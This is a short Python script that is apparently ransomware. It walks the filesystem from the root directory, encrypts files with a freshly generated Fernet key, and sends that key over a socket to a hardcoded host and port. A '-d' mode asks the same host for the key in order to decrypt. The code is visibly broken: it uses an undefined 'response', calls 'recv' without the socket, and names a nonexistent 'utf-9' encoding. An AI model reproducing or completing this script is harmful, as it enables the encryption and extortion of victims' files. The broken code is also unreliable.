from cryptography.fernet import Fernet
import os
import sys
import socket
import requests
        
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

host = "192.168.1.8"
port = 9002

def encrypt(filename, key):
    f = Fernet(key)

    with open(filename, "rb") as file:
        file_data = file.read()
    encrypted = f.encrypt(file_data)
    with open(filename, "wb") as file:
        file.write(encrypted)

def decrypt(filename, key):
    f = Fernet(key)
    with open(filename, "rb") as file:
        encrypted = file.read()
    decrypted = f.decrypt(encrypted)
    with open(filename, "wb") as file:
        file.write(decrypted)

def main():
    

    if response.status_code == 200:


        rootdir = "/"

        option = sys.argv[1]

        if option == "-e":
            s.connect((host, port))
            key = Fernet.generate_key()
            key = key
            for subdir, dirs, files in os.walk(rootdir):
                for file in files:
                    try:
                        encrypt(file, key)
                    except:
                        continue
            s.send(key)
            key = 0

        elif option == "-d":
            s.connect((host, port))
            str = bytes("request_key", "utf-8")
            s.send(str)
            key = recv(1024)
            key = key.decode("utf-9")
            for subdir, dir, files in os.walk(rootdir):
                for file in files:
                    try:
                        decrypt(file, key)
                    except:
                        continue
            key = 0

    else:
        print("Failed request")
        sys.exit(1)
if __name__ == "__main__":
    main()
